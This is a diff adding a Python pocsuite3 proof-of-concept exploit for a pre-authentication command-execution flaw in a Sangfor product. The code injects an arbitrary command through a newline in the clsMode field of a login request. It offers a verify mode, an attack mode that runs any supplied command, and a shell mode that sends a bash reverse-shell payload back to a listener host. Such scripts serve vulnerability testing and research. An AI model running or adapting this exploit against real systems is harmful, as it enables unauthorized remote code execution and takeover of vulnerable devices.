@@ -1,1 +1,85 @@
 
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+from pocsuite3.api import (
+    minimum_version_required, POCBase, register_poc, requests, logger,
+    OptString, OrderedDict,
+    random_str,
+    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
+)
+
+minimum_version_required('1.9.7')
+
+
+class DemoPOC(POCBase):
+    vulID = '99742'
+    version = '1'
+    author = 'sc'
+    vulDate = '2023-10-17'
+    createDate = '2023-10-17'
+    updateDate = '2023-10-17'
+    references = ['https://www.seebug.org/vuldb/ssvid-99742']
+    name = 'sangfor Pre-Auth Command Execution'
+    appPowerLink = ''
+    appName = 'sangfor'
+    appVersion = ''
+    vulType = 'Command Execution'
+    desc = 'Vulnerability description'
+    samples = ['']
+    install_requires = ['']
+    pocDesc = 'User manual of poc'
+    dork = {'zoomeye': ''}
+    suricata_request = ''
+    suricata_response = ''
+
+    def _options(self):
+        #规定传参的方法
+        o = OrderedDict()
+        #规定传参的参数名--cmd和默认值: 如果没有传参 则执行uname -a    
+        o['cmd'] = OptString('uname -a', description='The command to execute')
+        return o
+
+    def _exploit(self, param=''):
+        if not self._check(dork=''):
+            return False
+        #获取url路径
+        burp0_url = self.url+"/rep/login"
+        #请求头
+        burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip, deflate"}
+        #请求体
+        burp0_data = {"clsMode": f"cls_mode_login\n{param}\n", "index": "index", "log_type": "report", "loginType": "account", "page": "login", "rnd": "0", "userID": "admin", "userPsw": "123"}
+        res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
+        logger.debug(res.text)
+        return res.text
+
+    def _verify(self):
+
+        result = {}
+        #随机生成一个字符串
+        flag = random_str(6)
+        param = 'echo '+flag
+        res = self._exploit(param)
+        if res and flag in res and res.find('echo') == -1:
+            result['VerifyInfo'] = {}
+            result['VerifyInfo']['URL'] = self.url
+            #result['VerifyInfo'][flag] = res
+        return self.parse_output(result)
+
+    def _attack(self):
+        result = {}
+        param = self.get_option('cmd')
+        res = self._exploit(param)
+        result['VerifyInfo'] = {}
+        result['VerifyInfo']['URL'] = self.url
+        result['VerifyInfo'][param] = res[res.find('others') + 6:]
+        return self.parse_output(result)
+
+    def _shell(self):
+        try:
+            self._exploit(REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()))
+        except Exception:
+            pass
+
+
+register_poc(DemoPOC)
